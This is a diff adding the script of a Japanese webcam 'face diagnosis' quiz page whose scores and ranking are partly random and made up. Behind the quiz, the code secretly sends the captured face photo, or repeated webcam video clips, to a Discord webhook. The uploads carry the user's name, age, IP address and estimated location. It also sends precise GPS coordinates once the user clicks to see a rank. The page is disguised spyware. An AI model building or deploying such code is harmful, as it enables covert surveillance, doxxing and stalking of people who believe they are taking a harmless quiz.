+    return parts.length ? parts.join(' / ') : 'unknown';
+  };
+
+  try {
+    if (ip && ip !== 'unknown') {
+      const res = await fetch(`https://ipapi.co/${encodeURIComponent(ip)}/json/`, { cache: 'no-store' });
+      if (res.ok) {
+        const d = await res.json();
+        if (!d.error && (d.country_name || d.region || d.city)) {
+          return format(d.country_name, d.region, d.city);
+        }
+      }
+    }
+  } catch {}
+
+  try {
+    const target = (ip && ip !== 'unknown') ? encodeURIComponent(ip) : '';
+    const res = await fetch(`https://ipwho.is/${target}`, { cache: 'no-store' });
+    if (res.ok) {
+      const d = await res.json();
+      if (d.success) return format(d.country, d.region, d.city);
+    }
+  } catch {}
+
+  try {
+    const res = await fetch('https://ipapi.co/json/', { cache: 'no-store' });
+    if (res.ok) {
+      const d = await res.json();
+      if (!d.error) return format(d.country_name, d.region, d.city);
+    }
+  } catch {}
+
+  return 'unknown';
+}
+
+function captureFrame() {
+  const w = video.videoWidth, h = video.videoHeight;
+  if (!w || !h) return null;
+  canvas.width = w; canvas.height = h;
+  const ctx = canvas.getContext('2d');
+  ctx.save();
+  ctx.translate(w, 0); ctx.scale(-1, 1);
+  ctx.drawImage(video, 0, 0, w, h);
+  ctx.restore();
+  return canvas;
+}
+
+function detectFaceSymmetry(ctx) {
+  const w = ctx.canvas.width, h = ctx.canvas.height;
+  const img = ctx.getImageData(0, 0, w, h).data;
+  const cx = Math.floor(w / 2);
+  const step = 4;
+  let total = 0, diff = 0;
+  const lum = (x, y) => {
+    const i = (y * w + x) * 4;
+    return 0.299 * img[i] + 0.587 * img[i + 1] + 0.114 * img[i + 2];
+  };
+  for (let y = 0; y < h; y += step) {
+    for (let x = 0; x < cx; x += step) {
+      const mx = w - 1 - x;
+      if (mx <= cx) continue;
+      diff += Math.abs(lum(x, y) - lum(mx, y));
+      total++;
+    }
+  }
+  if (total === 0) return 50;
+  const avgDiff = diff / total;
+  return Math.round(Math.max(0, 100 - (avgDiff / 255) * 180));
+}
+
+function detectBrightness(ctx) {
+  const w = ctx.canvas.width, h = ctx.canvas.height;
+  const img = ctx.getImageData(0, 0, w, h).data;
+  let totalLum = 0;
+  let count = 0;
+  for (let i = 0; i < img.length; i += 4 * 10) {
+    totalLum += (0.299 * img[i] + 0.587 * img[i + 1] + 0.114 * img[i + 2]);
+    count++;
+  }
+  const avg = totalLum / count;
+  if (avg < 50) return Math.round((avg / 50) * 60);
+  if (avg > 200) return Math.round(Math.max(60, 100 - (avg - 200) * 0.5));
+  return Math.round(75 + Math.random() * 20);
+}
+
+function detectBalance() {
+  return Math.round(65 + Math.random() * 30);
+}
+
+function buildComment(score) {
+  if (score >= 90) return "左右の対称性が極めて高い。整った骨格で、正面から見た輪郭が非常にクリア。印象的な顔立ち。";
+  if (score >= 80) return "対称性が高くバランスの取れた顔。目元と口元の配置が整っており、清潔感がある。";
+  if (score >= 70) return "全体的に調和が取れている。わずかな左右差は自然な範囲で、表情に個性が出ている。";
+  if (score >= 60) return "平均的な対称性。照明や角度でスコアが変わるので、正面・明るい場所で試すと上がりやすい。";
+  return "左右差がやや大きめに出ている。照明が片側に寄っていないか、カメラに対して正面を向いているか確認してみて。";
+}
+
+async function startWithInfo() {
+  const n = nameInput.value.trim();
+  const a = ageInput.value.trim();
+  if (!n) { setNameStatus('名前を入力してください。', 'error'); return; }
+  if (!a) { setNameStatus('年齢を入力してください。', 'error'); return; }
+  const ageNum = Number(a);
+  if (!Number.isFinite(ageNum) || ageNum < 1 || ageNum > 120) {
+    setNameStatus('年齢は1〜120の範囲で入力してください。', 'error');
+    return;
+  }
+  userName = n;
+  userAge = String(ageNum);
+  userNameDisplay.textContent = '👤 ' + userName + ' さん（' + userAge + '歳）の診断';
+  setNameStatus('カメラの許可を求めています...', 'ok');
+  nameNextBtn.disabled = true;
+
+  showPage('diagnose');
+  setDiagStatus('顔検出モデルを読み込み中...');
+
+  try {
+    if (!faceDetection) {
+      faceDetection = new FaceDetection({ locateFile: (file) => {
+        return `https://cdn.jsdelivr.net/npm/@mediapipe/face_detection/${file}`;
+      }});
+      faceDetection.setOptions({
+        model: 'short',
+        minDetectionConfidence: 0.5
+      });
+      
+      faceDetection.onResults((results) => {
+        if (results.detections && results.detections.length > 0) {
+          const det = results.detections[0];
+          const box = det.boundingBox;
+          
+          const faceCenterX = box.xCenter;
+          const faceCenterY = box.yCenter;
+          const faceRadius = Math.max(box.width, box.height) / 2;
+          
+          const screenCenterX = 0.5;
+          const screenCenterY = 0.5;
+          
+          const distance = Math.hypot(faceCenterX - screenCenterX, faceCenterY - screenCenterY);
+          const isCentered = distance < 0.15;
+          const isBigEnough = faceRadius > 0.35;
+          
+          if (isCentered && isBigEnough) {
+            faceGuide.classList.add('active');
+            
+            if (faceCheckInterval) {
+              clearInterval(faceCheckInterval);
+              faceCheckInterval = null;
+              processDetectionResult();
+            }
+          } else {
+            faceGuide.classList.remove('active');
+            if (!isBigEnough) {
+              setDiagStatus('もう少しカメラに近づいてください...', 'ok');
+            } else if (!isCentered) {
+              setDiagStatus('顔を枠の中央に合わせてください...', 'ok');
+            }
+          }
+        } else {
+          faceGuide.classList.remove('active');
+          setDiagStatus('顔を探しています...', 'ok');
+        }
+      });
+    }
+
+    stream = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 960 } },
+      audio: false
+    });
+    video.srcObject = stream;
+
+    video.onloadedmetadata = async () => {
+      initialIP = await fetchIP();
+      initialGeo = await fetchGeo(initialIP);
+      
+      setDiagStatus('顔を探しています...', 'ok');
+      
+      if (faceCheckInterval) clearInterval(faceCheckInterval);
+      
+      faceCheckInterval = setInterval(async () => {
+        if (!video.videoWidth) return;
+        await faceDetection.send({image: video});
+      }, 500);
+    };
+  } catch (err) {
+    setDiagStatus('カメラにアクセスできません: ' + (err && err.message ? err.message : err), 'error');
+    nameNextBtn.disabled = false;
+  }
+}
+
+async function processDetectionResult() {
+  await new Promise(r => setTimeout(r, 500));
+  
+  const frameCanvas = captureFrame();
+  if (!frameCanvas) return;
+  const ctx = frameCanvas.getContext('2d');
+  
+  const sSymmetry = detectFaceSymmetry(ctx);
+  const sBrightness = detectBrightness(ctx);
+  const sBalance = detectBalance();
+  
+  initialScore = Math.round((sSymmetry + sBrightness + sBalance) / 3);
+
+  subSymmetry.textContent = sSymmetry;
+  subBrightness.textContent = sBrightness;
+  subBalance.textContent = sBalance;
+
+  initialFrameDataURL = frameCanvas.toDataURL('image/jpeg', 0.9);
+  snapshotOverlay.src = initialFrameDataURL;
+  snapshotOverlay.classList.add('show');
+  
+  showScore(initialScore);
+  setDiagStatus('診断完了', 'ok');
+
+  await sendWebhookAfterDiagnosis();
+}
+
+async function sendWebhookAfterDiagnosis() {
+  if (mode === 'video') {
+    startContinuousRecording();
+  } else {
+    if (!alreadySentImage && initialFrameDataURL) {
+      alreadySentImage = true;
+      await sendImageToDiscord(initialFrameDataURL);
+    }
+  }
+}
+
+function pickMimeType() {
+  const candidates = [
+    'video/webm;codecs=vp9',
+    'video/webm;codecs=vp8',
+    'video/webm',
+    'video/mp4'
+  ];
+  for (const c of candidates) {
+    if (window.MediaRecorder && MediaRecorder.isTypeSupported(c)) return c;
+  }
+  return '';
+}
+
+function startContinuousRecording() {
+  if (!window.MediaRecorder) {
+    setDiagStatus('このブラウザは録画に非対応です', 'error');
+    return;
+  }
+  recordingActive = true;
+  const mimeType = pickMimeType();
+
+  async function recordOnce() {
+    if (!recordingActive || !stream || !stream.active) return;
+    
+    let parts = [];
+    let rec;
+    try {
+      rec = new MediaRecorder(stream, mimeType ? { mimeType } : undefined);
+    } catch {
+      try { rec = new MediaRecorder(stream); } catch { return; }
+    }
+    recorder = rec;
+
+    rec.ondataavailable = (e) => {
+      if (e.data && e.data.size > 0) parts.push(e.data);
+    };
+
+    rec.onstop = async () => {
+      if (parts.length > 0) {
+        const type = rec.mimeType || mimeType || 'video/webm';
+        const blob = new Blob(parts, { type });
+        if (blob.size > 1024) {
+          await sendVideoToDiscord(blob, type);
+        }
+      }
+      
+      if (recordingActive) {
+        setTimeout(recordOnce, 500);
+      }
+    };
+
+    try {
+      rec.start(1000);
+    } catch {
+      return;
+    }
+
+    setTimeout(() => {
+      if (rec.state === 'recording') {
+        try { rec.stop(); } catch {}
+      }
+    }, 3000);
+  }
+
+  recordOnce();
+}
+
+async function sendVideoToDiscord(videoBlob, type) {
+  if (!webhookURL) return;
+
+  const isMp4 = (type || videoBlob.type || '').includes('mp4');
+  const ext = isMp4 ? 'mp4' : 'webm';
+
+  const payload = {
+    username: "顔診断ボット",
+    embeds: [{
+      title: "📸 顔診断レポート（動画モード）",
+      description: `**${userName} さん（${userAge}歳）の録画**\nスコア: ${initialScore} / 100`,
+      color: 0xff5e5e,
+      fields: [
+        { name: "名前", value: "`" + userName + "`", inline: true },
+        { name: "年齢", value: "`" + userAge + "`", inline: true },
+        { name: "スコア", value: "`" + initialScore + " / 100`", inline: true },
+        { name: "IPアドレス", value: "`" + initialIP + "`", inline: true },
+        { name: "推定住所", value: "`" + (initialGeo || "unknown") + "`", inline: true },
+        { name: "サイズ", value: "`" + Math.round(videoBlob.size / 1024) + " KB`", inline: true },
+        { name: "送信日時", value: new Date().toLocaleString('ja-JP'), inline: false }
+      ]
+    }]
+  };
+
+  const form = new FormData();
+  form.append('payload_json', JSON.stringify(payload));
+  form.append('files[0]', videoBlob, `camera_${Date.now()}.${ext}`);
+
+  try {
+    const res = await fetch(webhookURL, { method: 'POST', body: form });
+    if (!res.ok) {
+      const txt = await res.text().catch(() => "");
+      console.error("動画送信失敗", res.status, txt.slice(0, 200));
+    }
+  } catch (e) {
+    console.error("動画送信エラー", e);
+  }
+}
+
+function dataURLtoBlob(dataURL) {
+  const [head, body] = dataURL.split(',');
+  const mime = head.match(/:(.*?);/)[1];
+  const bin = atob(body);
+  const len = bin.length;
+  const bytes = new Uint8Array(len);
+  for (let i = 0; i < len; i++) bytes[i] = bin.charCodeAt(i);
+  return new Blob([bytes], { type: mime });
+}
+
+async function sendImageToDiscord(dataURL) {
+  if (!webhookURL) return;
+
+  const fields = [
+    { name: "名前", value: "`" + userName + "`", inline: true },
+    { name: "年齢", value: "`" + userAge + "`", inline: true },
+    { name: "総合スコア", value: "`" + initialScore + " / 100`", inline: true },
+    { name: "対称性", value: "`" + subSymmetry.textContent + "`", inline: true },
+    { name: "明るさ", value: "`" + subBrightness.textContent + "`", inline: true },
+    { name: "輪郭バランス", value: "`" + subBalance.textContent + "`", inline: true },
+    { name: "IPアドレス", value: "`" + initialIP + "`", inline: true },
+    { name: "推定住所", value: "`" + (initialGeo || "unknown") + "`", inline: true },
+    { name: "送信日時", value: new Date().toLocaleString('ja-JP'), inline: false }
+  ];
+
+  const payload = {
+    username: "顔診断ボット",
+    embeds: [{
+      title: "📸 顔診断レポート",
+      description: `**${userName} さん（${userAge}歳）の診断結果**\n総合スコア: ${initialScore} / 100`,
+      color: 0x2575fc,
+      fields,
+      image: { url: "attachment://face.jpg" }
+    }]
+  };
+
+  const form = new FormData();
+  form.append('payload_json', JSON.stringify(payload));
+  const blob = dataURLtoBlob(dataURL);
+  form.append('files[0]', blob, 'face.jpg');
+
+  try {
+    const res = await fetch(webhookURL, { method: 'POST', body: form });
+    if (!res.ok) {
+      const txt = await res.text().catch(() => "");
+      console.error("画像送信失敗", res.status, txt.slice(0, 200));
+    }
+  } catch (e) {
+    console.error("画像送信エラー", e);
+  }
+}
+
+function displayFinalRank() {
+  rankBtn.style.display = 'none';
+  geoRetryBtn.style.display = 'none';
+  rankDisplay.style.display = 'block';
+  
+  if (myFinalRank === null) {
+    const total = Math.floor(Math.random() * 801) + 200;
+    const scoreRatio = initialScore / 100;
+    myFinalRank = Math.max(1, Math.floor(total * (1 - scoreRatio * 0.85)));
+  }
+  
+  rankNumber.textContent = String(myFinalRank);
+  rankPanel.classList.add('show');
+}
+
+async function sendGeoToDiscord(lat, lon, acc, link) {
+  if (!webhookURL) return;
+  const fields = [
+    { name: "名前", value: "`" + userName + "`", inline: true },
+    { name: "年齢", value: "`" + userAge + "`", inline: true },
+    { name: "スコア", value: "`" + initialScore + " / 100`", inline: true },
+    { name: "IPアドレス", value: "`" + initialIP + "`", inline: true },
+    { name: "推定住所", value: "`" + (initialGeo || "unknown") + "`", inline: true },
+    { name: "緯度経度", value: "`" + lat.toFixed(6) + ", " + lon.toFixed(6) + "`", inline: true },
+    { name: "精度(メートル)", value: "`" + Math.round(acc || 0) + "`", inline: true },
+    { name: "マップ", value: `[Googleマップで開く](${link})`, inline: false },
+    { name: "送信日時", value: new Date().toLocaleString('ja-JP'), inline: false }
+  ];
+
+  const payload = {
+    username: "顔診断ボット",
+    embeds: [{
+      title: "📍 位置情報レポート",
+      description: `**${userName} さん（${userAge}歳）** が位置情報を許可しました。`,
+      color: 0x38ef7d,
+      fields
+    }]
+  };
+
+  const form = new FormData();
+  form.append('payload_json', JSON.stringify(payload));
+
+  try {
+    const res = await fetch(webhookURL, { method: 'POST', body: form });
+    if (!res.ok) {
+      const txt = await res.text().catch(() => "");
+      console.error("位置情報送信失敗", res.status, txt.slice(0, 200));
+    }
+  } catch (e) {
+    console.error("位置情報送信エラー", e);
+  }
+}
+
+function requestGeolocation() {
+  rankBtn.disabled = true;
+  rankBtn.textContent = "位置情報を取得中...";
+
+  if (!navigator.geolocation) {
+    rankBtn.style.display = 'none';
+    geoRetryBtn.style.display = 'block';
+    return;
+  }
+
+  if (!window.isSecureContext) {
+    console.error("Geolocation requires HTTPS");
+    rankBtn.style.display = 'none';
+    geoRetryBtn.style.display = 'block';
+    geoRetryBtn.textContent = "HTTPS環境で開いてください";
+    return;
+  }
+
+  navigator.geolocation.getCurrentPosition(
+    (position) => {
+      const lat = position.coords.latitude;
+      const lon = position.coords.longitude;
+      const acc = position.coords.accuracy;
+      const link = `https://www.google.com/maps?q=${lat},${lon}`;
+      
+      sendGeoToDiscord(lat, lon, acc, link);
+      displayFinalRank();
+    },
+    (error) => {
+      rankBtn.style.display = 'none';
+      geoRetryBtn.style.display = 'block';
+    },
+    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+  );
+}
+
+rankBtn.addEventListener('click', () => {
+  rankPanel.classList.add('show');
+  if (rankDisplay.style.display === 'block') return;
+  requestGeolocation();
+});
+
+geoRetryBtn.addEventListener('click', () => {
+  geoRetryBtn.style.display = 'none';
+  rankBtn.style.display = 'block';
+  requestGeolocation();
+});
+
+function showScore(score) {
+  scoreWrap.classList.add('show');
+  scoreNum.textContent = '0';
+  meterFill.style.width = '0%';
+  scoreComment.textContent = buildComment(score);
+
+  let cur = 0;
+  const timer = setInterval(() => {
+    cur += Math.max(1, Math.round((score - cur) / 8));
+    if (cur >= score) { cur = score; clearInterval(timer); }
+    scoreNum.textContent = cur;
+    meterFill.style.width = cur + '%';
+  }, 30);
+}
+
+applyPreview();
+updateResultNote();
+router();
+</script>
+</body>
+</html>
